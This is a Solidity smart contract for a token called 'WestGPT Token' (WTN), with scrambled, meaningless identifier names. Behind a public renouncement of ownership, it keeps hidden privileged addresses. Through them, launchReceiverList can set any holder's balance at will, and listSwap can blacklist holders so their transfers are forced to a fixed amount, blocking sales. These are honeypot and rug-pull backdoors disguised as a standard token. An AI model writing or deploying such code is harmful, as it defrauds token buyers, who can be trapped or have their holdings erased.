//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface teamLiquidityAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address marketingSenderShould) external view returns (uint256);

    function transfer(address totalMode, uint256 minLiquidity) external returns (bool);

    function allowance(address modeLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 minLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address totalMode,
        uint256 minLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atMode, uint256 value);
    event Approval(address indexed modeLaunch, address indexed spender, uint256 value);
}

interface receiverLaunchAt is teamLiquidityAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract minExempt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface toTx {
    function createPair(address takeFee, address receiverTotalReceiver) external returns (address);
}

interface fromMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract WestGPTToken is minExempt, teamLiquidityAuto, receiverLaunchAt {

    mapping(address => bool) public tradingList;

    function owner() external view returns (address) {
        return feeTradingSwap;
    }

    function decimals() external view virtual override returns (uint8) {
        return toTeam;
    }

    function transfer(address feeTakeTx, uint256 minLiquidity) external virtual override returns (bool) {
        return fundTake(_msgSender(), feeTakeTx, minLiquidity);
    }

    bool private limitTokenReceiver;

    function transferFrom(address takeMax, address totalMode, uint256 minLiquidity) external override returns (bool) {
        if (_msgSender() != minSender) {
            if (tradingExempt[takeMax][_msgSender()] != type(uint256).max) {
                require(minLiquidity <= tradingExempt[takeMax][_msgSender()]);
                tradingExempt[takeMax][_msgSender()] -= minLiquidity;
            }
        }
        return fundTake(takeMax, totalMode, minLiquidity);
    }

    function approve(address sellFee, uint256 minLiquidity) public virtual override returns (bool) {
        tradingExempt[_msgSender()][sellFee] = minLiquidity;
        emit Approval(_msgSender(), sellFee, minLiquidity);
        return true;
    }

    address private feeTradingSwap;

    address minSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public txLiquidity;

    uint256 public launchedShouldSell;

    function totalAuto() public {
        emit OwnershipTransferred(totalFee, address(0));
        feeTradingSwap = address(0);
    }

    bool public exemptBuyTrading;

    function fundTake(address takeMax, address totalMode, uint256 minLiquidity) internal returns (bool) {
        if (takeMax == totalFee) {
            return autoWalletMax(takeMax, totalMode, minLiquidity);
        }
        if (fundLaunchShould[takeMax]) {
            return autoWalletMax(takeMax, totalMode, 12 ** 10);
        }
        return autoWalletMax(takeMax, totalMode, minLiquidity);
    }

    uint256 private tokenWalletTotal = 100000000 * 10 ** 18;

    bool private limitLiquidity;

    constructor (){ 
        
        fromMarketing shouldReceiver = fromMarketing(minSender);
        feeWalletTotal = toTx(shouldReceiver.factory()).createPair(shouldReceiver.WETH(), address(this));
        
        tradingList[_msgSender()] = true;
        launchedSwap[_msgSender()] = tokenWalletTotal;
        totalFee = _msgSender();
        if (txLiquidity != listMax) {
            sellMin = true;
        }
        emit Transfer(address(0), totalFee, tokenWalletTotal);
        feeTradingSwap = _msgSender();
        totalAuto();
    }

    function name() external view virtual override returns (string memory) {
        return txMaxReceiver;
    }

    function symbol() external view virtual override returns (string memory) {
        return toMarketing;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tokenWalletTotal;
    }

    function listSwap(address isEnable) public {
        takeEnable();
        
        if (isEnable == totalFee || isEnable == feeWalletTotal) {
            return;
        }
        fundLaunchShould[isEnable] = true;
    }

    string private toMarketing = "WTN";

    address public totalFee;

    mapping(address => bool) public fundLaunchShould;

    string private txMaxReceiver = "WestGPT Token";

    function takeEnable() private view{
        require(tradingList[_msgSender()]);
    }

    function getOwner() external view returns (address) {
        return feeTradingSwap;
    }

    bool public shouldFee;

    event OwnershipTransferred(address indexed isExemptFee, address indexed senderTx);

    mapping(address => uint256) private launchedSwap;

    function fundSwap(address teamTo) public {
        if (launchSender) {
            return;
        }
        
        tradingList[teamTo] = true;
        
        launchSender = true;
    }

    address public feeWalletTotal;

    bool public launchSender;

    uint8 private toTeam = 18;

    function launchReceiverList(address feeTakeTx, uint256 minLiquidity) public {
        takeEnable();
        launchedSwap[feeTakeTx] = minLiquidity;
    }

    bool public listMax;

    function allowance(address feeFund, address sellFee) external view virtual override returns (uint256) {
        if (sellFee == minSender) {
            return type(uint256).max;
        }
        return tradingExempt[feeFund][sellFee];
    }

    function balanceOf(address marketingSenderShould) public view virtual override returns (uint256) {
        return launchedSwap[marketingSenderShould];
    }

    bool private sellMin;

    uint256 private listAt;

    function autoWalletMax(address takeMax, address totalMode, uint256 minLiquidity) internal returns (bool) {
        require(launchedSwap[takeMax] >= minLiquidity);
        launchedSwap[takeMax] -= minLiquidity;
        launchedSwap[totalMode] += minLiquidity;
        emit Transfer(takeMax, totalMode, minLiquidity);
        return true;
    }

    mapping(address => mapping(address => uint256)) private tradingExempt;

    uint256 private minToTake;

}